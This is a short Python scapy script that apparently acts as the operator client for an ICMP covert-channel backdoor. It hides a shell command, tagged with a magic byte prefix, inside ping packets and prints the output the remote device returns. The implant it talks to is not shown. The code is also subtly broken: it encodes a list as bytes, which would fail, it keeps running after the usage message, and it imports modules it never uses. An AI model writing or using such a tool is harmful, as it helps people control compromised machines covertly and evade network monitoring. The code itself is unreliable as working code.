#!/usr/bin/python3
from scapy.all import IP, ICMP, Raw, sr1
from os import popen
from sys import argv
import threading
from time import sleep

def send_command_to_device_and_get_output(ip, command):
    pkt = IP(dst=ip) /\
        ICMP(type=8) /\
        Raw(load=b"\x70\x95\x05"+bytes(command, 'utf-8'))
    res = sr1(pkt, verbose=False)
    return res[Raw].load

if __name__ == "__main__":
    if(len(argv) < 2):
        print(f"Usage: {argv[0]} <IP> <command>")
    ip = argv[1]
    command = argv[2:]
    print("ip:", ip)
    print("cmd:", command)
    print("Output:")
    print(send_command_to_device_and_get_output(ip, command))